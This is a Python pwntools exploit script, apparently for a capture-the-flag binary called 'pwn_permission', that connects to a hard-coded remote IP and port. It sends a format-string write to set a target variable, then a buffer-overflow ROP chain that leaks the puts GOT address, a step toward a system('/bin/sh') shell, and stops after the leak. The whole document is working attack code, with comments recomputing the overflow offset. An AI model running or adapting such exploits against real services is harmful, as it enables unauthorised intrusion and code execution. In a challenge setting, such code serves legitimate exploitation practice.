from pwn import *

context(arch='i386', os='linux', log_level='debug')

elf = ELF('pwn_permission')

# Addresses
puts_plt = elf.plt['puts']      # 0x8049060
puts_got = elf.got['puts']      # 0x804c014
vuln_addr = elf.symbols['vuln'] # 0x8049227
main_addr = elf.symbols['main'] # 0x8049270
target_val_addr = 0x804c030

# ROP gadget: ret for stack alignment
ret_gadget = 0x804900e

# vuln buffer is at ebp-0x90, saved ebp at ebp, return addr at ebp+4
# So offset = 0x90 + 4 = 148 bytes to overwrite return address
# Wait, let me recalculate:
# sub esp, 0x94 in vuln
# push ebx at the beginning
# So: buffer at ebp-0x90, saved ebx at ebp-4, saved ebp at ebp, ret at ebp+4
# Offset from buffer to ret = 0x90 + 4 + 4 = 0x98 = 152

# Actually let me re-examine vuln:
# push ebp         ; save old ebp
# mov ebp, esp     ; set frame pointer
# push ebx         ; save ebx (at ebp-4)
# sub esp, 0x94    ; allocate 0x94 bytes (buffer at ebp-0x90 to ebp+4-0x90)
# Wait, the buffer is at ebp-0x90
# read(0, ebp-0x90, 0x100)
# So from buffer start to saved ebp = 0x90 bytes
# From buffer start to return address = 0x90 + 4 = 148 bytes

buf_to_ret = 0x90 + 4  # 148

log.info(f"Buffer to return address offset: {buf_to_ret}")

# Stage 1: Format string to set target_val = 5
fmt_payload = p32(target_val_addr) + b'%1c%4$n'

# Stage 2: ROP chain to leak puts@GOT and return to vuln
# We'll leak puts address, then calculate system and /bin/sh addresses
rop_payload = b'A' * buf_to_ret
rop_payload += p32(puts_plt)    # call puts
rop_payload += p32(vuln_addr)   # return to vuln for second stage
rop_payload += p32(puts_got)    # argument: puts@GOT

# Connect
conn = remote('39.96.193.120', 10000)

# Receive initial message
conn.recv(timeout=5)

# Stage 1: Send format string payload
conn.send(fmt_payload)

# Wait for "Hope you have a good time here." and "Input:\n"
import time
time.sleep(1)
response = conn.recv(timeout=5)
log.info(f"After fmt payload: {response}")

# Stage 2: Send ROP payload to leak puts address
conn.send(rop_payload)

time.sleep(1)

# Receive the leaked puts address
# The output will be: some garbage + puts_addr + "Input:\n" (from vuln return)
try:
    leak_data = conn.recv(timeout=5)
    log.info(f"Leak data raw: {leak_data}")
    
    # Find the leaked address in the response
    # It should be after some output and before "Input:\n"
    # The puts output will end with \n
    lines = leak_data.split(b'\n')
    log.info(f"Lines: {lines}")
    
    # Try to extract the puts address
    # It should be a 4-byte little-endian value printed by puts
    for line in lines:
        if len(line) >= 4:
            # Try to interpret as address
            potential_addr = u32(line[:4].ljust(4, b'\x00'))
            if 0xf7000000 < potential_addr < 0xf7ffffff:
                puts_addr = potential_addr
                log.info(f"Leaked puts address: 0x{puts_addr:x}")
                break
    else:
        # Try another approach - just take the first 4 bytes after "Hope..."
        log.info("Trying alternative leak extraction")
        # Skip "Hope you have a good time here.\n" and look for the leak
        idx = leak_data.find(b'here.\n')
        if idx >= 0:
            after_here = leak_data[idx+6:]
            log.info(f"After 'here.': {after_here.hex()}")
            if len(after_here) >= 4:
                puts_addr = u32(after_here[:4].ljust(4, b'\x00'))
                log.info(f"Potential puts address: 0x{puts_addr:x}")
except Exception as e:
    log.error(f"Error receiving leak: {e}")

conn.close()